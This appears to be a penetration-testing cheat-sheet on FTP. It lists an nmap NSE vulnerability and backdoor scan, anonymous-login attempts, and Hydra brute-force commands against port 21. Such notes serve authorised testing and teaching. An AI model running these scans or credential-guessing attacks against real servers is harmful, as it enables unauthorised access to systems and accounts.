# Background
If you can't get access to FTP through these steps, then you need credentials from some other area to authenticate.

# Exploit

## Test NSE Common Vulnerabilities
NSE has a number of scripts available to test for common vulnerabilities in this service.
```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
```

## Anonymous Login
Many FTP servers allow anonymous users to authenticate.  Always attempt to login with anonymous credentials. 
``` 
ftp [IP] username: [anonymous or anon] password: [anonymous or password] 
``` 

## Brute Force
Hydra has a built-in module for attempting usernames and passwords over FTP.
```
hydra -t 1 -L [username list/file] -P [password list/file] -vV ftp://[IP]:21
```
```
hydra -t 1 -C [colon separated username and password list/file] -vV ftp://[IP]:21 
```
